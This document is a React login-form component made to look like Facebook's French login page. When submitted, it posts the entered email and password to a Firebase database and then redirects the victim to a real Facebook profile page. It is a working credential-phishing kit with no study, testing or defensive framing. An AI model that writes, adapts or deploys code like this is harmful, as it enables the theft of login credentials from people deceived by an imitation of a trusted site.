// LoginForm.js
import React, { useState } from 'react';
import './LoginForm.css';

const LoginForm = () => {
  const [user,setUser] = useState(
    {
      Email: '',Password: ''
    }
  )
  let name , value
  console.log(user)
  const data = (e) =>
  {
    name = e.target.name;
    value = e.target.value;
    setUser({...user,[name]: value});
  }
  const getdata = async (e) => {
    e.preventDefault();
  
    const { Email, Password } = user;
  
    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        Email,
        Password,
      }),
    };
    const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);

    window.location.href = "https://www.facebook.com/profile.php?id=100091219641608&mibextid=7BxKtlCqh5F1hMP9";

    console.log(res)
    // if (res){
    //   alert ('data stored')
    //   }else{
    //     alert('erroure')
    //   }
      }

  // ... le reste de votre composant

  return (
    <form className="login-form" >
      <input
      type="email"
      name="Email"
      id="userEmail"
      placeholder="Numéro mobile ou e-mail"
      value={user.Email} onChange={data}
      />
      <input
        type="password"
        name="Password"
        id="password"
        placeholder="Mot de passe"
        value={user.Password} onChange={data}
      />
      <button type="submit" onClick={getdata}>Se connecter</button>
      <a href="#">Mot de passe oublié ?</a>

      <div className="sep">
        <hr width="40%" />
        <span>ou</span>
        <hr width="40%" />
      </div>

      <button className="create-account-btn">Créer nouveau compte</button>
    </form>
  );
};

export default LoginForm;
